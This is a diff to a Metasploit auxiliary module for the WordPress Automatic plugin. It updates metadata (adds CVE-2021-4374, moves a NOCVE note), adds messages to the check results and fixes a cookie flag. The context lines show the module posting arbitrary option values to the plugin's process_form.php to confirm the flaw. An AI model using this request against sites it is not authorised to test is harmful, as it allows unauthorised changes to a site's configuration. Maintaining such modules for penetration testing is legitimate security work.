@@ -31,13 +31,14 @@ class MetasploitModule < Msf::Auxiliary
         'Targets' => [['WordPress', {}]],
         'DefaultTarget' => 0,
         'References' => [
-          ['URL', 'https://blog.nintechnet.com/critical-vulnerability-fixed-in-wordpress-automatic-plugin/'],
-          ['NOCVE', 'Patched in 3.53.3 without vendor disclosure']
+          ['CVE', '2021-4374'],
+          ['URL', 'https://blog.nintechnet.com/critical-vulnerability-fixed-in-wordpress-automatic-plugin/']
         ],
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'Reliability' => [],
-          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]
+          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS],
+          'NOCVE' => ['Patched in 3.53.3 without vendor disclosure']
         }
       )
     )
@@ -58,9 +59,9 @@ class MetasploitModule < Msf::Auxiliary
     # check_plugin_version_from_readme('wp-automatic', '3.53.3')
 
     if set_wp_option(Rex::Text.rand_text_numeric(8..20), Rex::Text.rand_text_numeric(8..20))
-      checkcode = Exploit::CheckCode::Vulnerable
+      checkcode = Exploit::CheckCode::Vulnerable('SQL injection via WP Automatic plugin confirmed')
     else
-      checkcode = Exploit::CheckCode::Safe
+      checkcode = Exploit::CheckCode::Safe('WP Automatic plugin is not vulnerable')
       print_error('Automatic not a vulnerable version')
     end
     checkcode
@@ -72,7 +73,7 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'wp-automatic', 'process_form.php'),
       'headers' => { 'X-Requested-With' => 'XMLHttpRequest' },
       'vars_post' => { key => value },
-      'keep_cookies' => 'true'
+      'keep_cookies' => true
     })
     fail_with(Failure::Unreachable, 'Site not responding') unless res
     res && res.code == 200 && res.body.include?('{"status":"success"}')
